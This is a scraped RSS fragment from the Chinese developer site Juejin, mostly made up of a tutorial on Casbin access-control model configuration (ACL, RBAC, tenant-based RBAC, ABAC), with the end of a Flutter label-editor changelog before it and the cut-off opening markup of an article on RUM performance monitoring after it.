<li><code>添加圆形图元(支持设置是否填充 支持设置边框宽度)</code></li>
<li><code>图元支持选中 平移 拉伸 任意角度旋转 旋转不影响手势响应 旋转之后平移拉伸交互合理</code></li>
<li><code>添加文本 暂时支持普通绘制</code></li>
<li><code>增加刻度</code></li>
<li><code>修改图元的宽高坐标都以刻度尺数值为准</code></li>
<li><code>修复圆形旋转120度 拉伸异常问题</code></li>
<li><code>文本支持水平 垂直 居左中右 均分</code></li>
<li><code>文本支持字号 字间距 行间距 调整</code></li>
<li><code>文本支持粗体 斜体 下划线 中划线 设置</code></li>
<li><code>文本支持自动字号 文本颜色调整</code></li>
<li><code>实现图形的添加 圆形 三角形 多边形</code></li>
<li><code>支持设置虚线 调整线条宽度 设置是否填充</code></li>
</ol>
<p>....持续开发</p>
<p>下一个功能 图形属性页面 三角形 矩形 圆形</p>
<p>当前效果图</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b78b872eb02d4f25be588cd7c0daeb21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942397&amp;x-signature=0iH8%2Bt4EUIzqPc8F5upxVYO6vGg%3D" alt="img_v3_02sq_352d28d2-e431-4976-855d-0600e5af808g.jpg" width="30%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7409098905ed4d3ca9b17134e81eb764~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942397&amp;x-signature=Ds2FZ%2BimRvDWaRmmPQXGK9WdHTk%3D" alt="img_v3_02sq_7c34eb15-e2c5-4e42-9ab9-e3e4d571c23g.jpg" width="30%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/964dab45ff524141acba213400871fc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942397&amp;x-signature=e0VRWbgEYmM5gcWjs0guV84lqds%3D" alt="20251210-113106.jpg" width="30%" loading="lazy"/>
<p>感兴趣可以下载瞅瞅:
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FnewPersonKing%2Fflutter_label" target="_blank" title="https://github.com/newPersonKing/flutter_label" ref="nofollow noopener noreferrer">github.com/newPersonKi…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解读Casbin 之一： 常见的访问控制模型配置]]></title>    <link>https://juejin.cn/post/7581769891498835987</link>    <guid>https://juejin.cn/post/7581769891498835987</guid>    <pubDate>2025-12-10T03:13:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891498835987" data-draft-id="7581669438576820260" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解读Casbin 之一： 常见的访问控制模型配置"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T03:13:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="西门老铁"/> <meta itemprop="url" content="https://juejin.cn/user/4336129588855143"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解读Casbin 之一： 常见的访问控制模型配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129588855143/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    西门老铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:13:13.000Z" title="Wed Dec 10 2025 03:13:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>权限控制是每个管理系统的关键组成部分，而Casbin是一个强大且高效的开源访问控制库，支持各种<a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FAccess_control%23Access_control_models" target="_blank" title="https://en.wikipedia.org/wiki/Access_control#Access_control_models" ref="nofollow noopener noreferrer">访问控制模型</a>，用于在全局范围内执行授权。</p>
<p>Casbin 目前支持 Golang、Java、C/C++、Node.js、Javascript、PHP、Laravel、Python、.NET (C#)、Delphi、Rust、Ruby、Swift (Objective-C)、Lua (OpenResty)、Dart (Flutter) 和 Elixir。</p>
<p>本文将通过简单易懂的流程演示 casbin 的工作原理及其不同的可用模型配置。</p>
<h2 data-id="heading-0">Casbin 的工作流程</h2>
<p>在深入了解不同的模型配置之前，让我们先通过如下所示的简单概览图来了解 casbin 的工作流程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f11821e431744e72a952c59b5043a145~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_6Zeo6ICB6ZOB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941193&amp;x-signature=4Yt5YMBTGfwdBCCOrGly7eIF%2BZA%3D" alt="image.png" loading="lazy"/></p>
<p>上图将整个工作流程分为两个阶段，即<em>配置策略</em>和<em>执行策略</em>。</p>
<h3 data-id="heading-1">配置策略</h3>
<p>此阶段定义了权限控制的方法，包括定义权限模型和权限策略。</p>
<h4 data-id="heading-2">STEP 1 Model（定义模型）</h4>
<p>在这里，我们根据需求配置模型。我们使用<a href="https://link.juejin.cn?target=https%3A%2F%2Ffile.org%2Fextension%2Fconf" target="_blank" title="https://file.org/extension/conf" ref="nofollow noopener noreferrer">CONF</a>文件（.conf 文件扩展名）来抽象模型配置。此配置基于 PERM 元模型（Policy, Effect, Request, Matchers）分别表示策略，效果，请求，匹配器。</p>
<p>在上图中，演示了 Casbin 中最基本、最简单的ACL模型。</p>
<h4 data-id="heading-3">STEP 2 Policy（定义策略）</h4>
<p>策略的基本逻辑是<code>谁可以做什么</code></p>
<p>策略的基本语法是<code>p = sub, obj, act, eft</code></p>
<p>这种语法可以理解为：谁（<strong>sub</strong>）可以/不能（<strong>eft:allow/deny</strong>）对某个资源（<strong>obj</strong>）执行什么（<strong>act</strong>）。</p>
<p>这里<code>eft</code>可以是 <code>true``allow</code>或 <code>false</code> <code>deny</code>。如果未指定，则默认值为 <code>true</code> <code>allow</code>。</p>
<p>上图中已指明了四条权限策略：</p>
<ol>
<li>John 可以阅读 RECORD1</li>
<li>John 不能写入 RECORD1</li>
<li>Harry 可以阅读 RECORD1</li>
<li>Harry 可以修改 RECORD1</li>
</ol>
<h3 data-id="heading-4">执行策略</h3>
<p>此阶段基于模型和策略进行权限的判断。</p>
<h4 data-id="heading-5">STEP 3 Request（发起请求）</h4>
<p>请求定义了用户尝试访问某个资源或对其执行所需操作时的动作。</p>
<p>图中所示有两条请求。</p>
<ol>
<li>John 阅读 RECORD1</li>
<li>John 写入 RECORD1</li>
</ol>
<h4 data-id="heading-6">STEP 4 Matcher（将请求匹配策略）</h4>
<p>执行策略的第一步是根据请求查询匹配的策略。在上面的示例中，我们使用以下匹配表达式来确保请求中的主题、对象和操作与策略规则中的相应内容相匹配。我们可以把它理解为一个 SQL 查询的 WHERE 语句，<code>r</code>对象即是请求体，<code>p</code> 对象是策略列表中的记录。</p>
<pre><code class="hljs language-css" lang="css">m = r<span class="hljs-selector-class">.sub</span> == <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sub</span> &amp;&amp; r<span class="hljs-selector-class">.obj</span> == <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.obj</span> &amp;&amp; r<span class="hljs-selector-class">.act</span> == <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.act</span>
</code></pre>
<h4 data-id="heading-7">STEP 5 Policy Effect（最终判定）</h4>
<p>匹配器可能查询到多条记录，这里定义了如何根据匹配到的策略决定最终结果。在上面的示例中，我们定义了以下策略，这个语句表示只要存在一个匹配的策略允许用户执行操作，最终结果即允许。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">e</span> = some(where (p.eft == allow))
</code></pre>
<p>另一种更严谨的验证方式同时要求确保没有策略禁止用户执行操作：</p>
<pre><code class="hljs language-scss" lang="scss">e = <span class="hljs-built_in">some</span>(where (p.eft == allow)) &amp;&amp; !<span class="hljs-built_in">some</span>(where (p.eft == deny))
</code></pre>
<p>根据以上判定，casbin 的授权结果为</p>
<ol>
<li>John 可以阅读 RECORD1 ✔️</li>
<li>John 不能写入 RECORD1 ❌</li>
</ol>
<h2 data-id="heading-8">更多访问控制模型</h2>
<p>前面演示了最简单的 ACL 访问控制模型，下面我们看看如何定义其他常见的访问控制模型，如 RBAC，ABAC 等。</p>
<h3 data-id="heading-9">基于角色的访问控制（RBAC）</h3>
<p>ACL 提供了一对一的操作授权。这种方式在现实使用中往往会导致较大的工作量，RBAC将用户分配到不同的角色，并将权限分配给角色，而不是分配给单个用户。</p>
<blockquote>
<p>假设共有三个用户：user1、user2 和 user3，以及两个角色：admin 和 user。在这种情况下，我们定义权限的对象是角色，而不是单个用户。</p>
<p>用户1和用户2拥有用户角色，<br/>
用户3拥有管理员角色。</p>
<p>用户只能读取记录1（user1，user2），<br/>
管理员可以读写记录1（user3）。</p>
</blockquote>
<p><strong>Casbin 模型配置</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act

<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub) &amp;&amp; r.obj == p.obj &amp;&amp; r.act == p.act

</code></pre>
<p>与之前相同，但我们<code>g</code>在这里添加了一个参数。</p>
<p><code>g = _, _</code>定义了用户的角色。</p>
<p><code>matcher</code>中也增加了一个表达式<code>g(r.sub, p.sub)</code>，表示了<code>g</code>的字段，第一个是 <code>r.sub</code>表示发起请求的主体即用户，第二个是<code>p.sub</code>表示授权的主体即角色，下面我们就可以在 policy 列表中定义用户所属的角色信息了。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// user1 是管理员 admin，admin 可以写 record1 ，也就是 user1 可以写 record1</span>

p, admin, record1, write
g, user1, admin
</code></pre>
<h3 data-id="heading-10">基于资源角色的RBAC</h3>
<p>就像我们将用户分组为角色一样，我们也可以将资源分组并进行分配，而不是一次分配一个资源。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act

<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _
<span class="hljs-attr">g2</span> = _, _

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub) &amp;&amp; g2(r.obj, p.obj) &amp;&amp; r.act == p.act
</code></pre>
<p>这里我们添加了<code>g2</code>一个参数。</p>
<p><code>g2 = _, _</code>定义资源的角色。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// record1 和 record2 被分组到记录中，用户 1 可以写入记录，这意味着用户 1 可以同时写入 record1 和 record2。p、用户1、记录、写入</span>

p, user1, record, write  
g2, record1, record  
g2, record2, record
</code></pre>
<h3 data-id="heading-11">基于域（租户）的RBAC</h3>
<p>这是基于角色的访问控制 (RBAC) 的另一种版本，当系统中存在多个租户时，它至关重要。<em>用户在不同的租户中扮演不同的角色</em>。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, dom, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, dom, obj, act

<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _, _

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub, r.dom) &amp;&amp; r.dom == p.dom &amp;&amp; r.obj == p.obj &amp;&amp; r.act == p.act
</code></pre>

<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">//用户1是租户1的管理员，用户2是租户2的管理员。租户1的管理员（即用户1）可以读取和写入数据1。同样，租户2的管理员（即用户2）可以读取和写入数据2。这也意味着用户1没有读取/写入数据2的权限，反之亦然。</span>

<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant1</span>, <span class="hljs-selector-tag">data1</span>, <span class="hljs-selector-tag">read</span>
<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant1</span>, <span class="hljs-selector-tag">data1</span>, <span class="hljs-selector-tag">write</span>
<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant2</span>, <span class="hljs-selector-tag">data2</span>, <span class="hljs-selector-tag">read</span>
<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant2</span>, <span class="hljs-selector-tag">data2</span>, <span class="hljs-selector-tag">writeg</span>, <span class="hljs-selector-tag">user1</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant1</span>
<span class="hljs-selector-tag">g</span>, <span class="hljs-selector-tag">user2</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant2</span>
</code></pre>
<h3 data-id="heading-12">基于属性的访问控制（ABAC）</h3>
<p>如果上述任何模型都无法解决您的用例，还有另一种模型可以提供更细粒度的搜索/匹配。评估是基于特定属性（例如用户属性）进行的。在 Casbin 中，这些属性可以是主体、客体或操作的属性。</p>
<p>例如，基于角色的访问控制（RBAC）系统会授予所有经理访问权限，而基于属性的访问控制（ABAC）策略则只会授予财务部门经理访问权限。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = r.sub == r.obj.Owner
</code></pre>
<p>此模态配置仅检查发出请求的用户是否是所请求对象的拥有者。</p>
<p>假设有以下请求：</p>
<blockquote>
<p>user1 请求访问 {Owner:"user1"}<br/>
user1 请求访问 {Owner:"user2"}</p>
</blockquote>
<p>映射到 <code>r = sub,obj,act</code></p>
<blockquote>
<p>sub= user1<br/>
obj= {Owner:"user1"}</p>
</blockquote>
<p>又有<code>r.sub == r.obj.Owner</code></p>
<blockquote>
<p>user1 == user1 // 第一个请求被允许<br/>
user1 != user2 // 第二个请求无法匹配 matcher，所以被拒绝</p>
</blockquote>
<h2 data-id="heading-13">官方文档和工具</h2>
<p>同样，Casbin 支持定义各种丰富的模型以适应不同的业务场景。您可以通过官方文档<a href="https://link.juejin.cn?target=https%3A%2F%2Fcasbin.org%2Fzh%2Fdocs%2Fsupported-models" target="_blank" title="https://casbin.org/zh/docs/supported-models" ref="nofollow noopener noreferrer">《支持的模型》</a>进一步了解其他访问控制模型。</p>
<p>也可以利用官方提供的<a href="https://link.juejin.cn?target=https%3A%2F%2Fcasbin.org%2Feditor%2F" target="_blank" title="https://casbin.org/editor/" ref="nofollow noopener noreferrer">Casbin 在线编辑器</a>尝试编写和执行不同的模型和策略。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用户说卡但我测不出来？RUM 监控：直接去 “用户手机里” 抓薛定谔的 Bug]]></title>    <link>https://juejin.cn/post/7581752508780724267</link>    <guid>https://juejin.cn/post/7581752508780724267</guid>    <pubDate>2025-12-10T03:36:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752508780724267" data-draft-id="7581761825482719268" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用户说卡但我测不出来？RUM 监控：直接去 “用户手机里” 抓薛定谔的 Bug"/> <meta itemprop="keywords" content="前端,性能优化"/> <meta itemprop="datePublished" content="2025-12-10T03:36:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PineappleCoder"/> <meta itemprop="url" content="https://juejin.cn/user/3323167184272627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用户说卡但我测不出来？RUM 监控：直接去 “用户手机里” 抓薛定谔的 Bug
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3323167184272627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PineappleCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:36:21.000Z" title="Wed Dec 10 2025 03:36:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item 